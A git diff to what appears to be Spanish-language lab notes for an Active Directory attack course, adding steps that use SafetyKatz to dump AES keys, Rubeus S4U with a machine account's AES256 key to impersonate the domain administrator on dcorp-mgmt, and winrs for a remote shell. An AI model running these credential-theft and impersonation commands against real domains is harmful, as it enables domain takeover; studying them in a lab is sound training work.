@@ -1326,4 +1326,14 @@ Ahora deberemos de obtener las claves AES desde una CMD como Admonistrador
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
 ```
 
-Ahora co n 
+Ahora con *Rubeus* obtendremos acceso como administrador de dominio a *mgmt*
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std97$ /aes256:97e87ad2e903a131a432a29a9608d931c88fe2196fdd94ec9e76012067fa17f1 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+```
+
+Pudiendo ahora acceder a *dcorp-mgmt*
+```shell
+winrs -r:dcorp-mgmt cmd
+```
+
+*LO - 18*
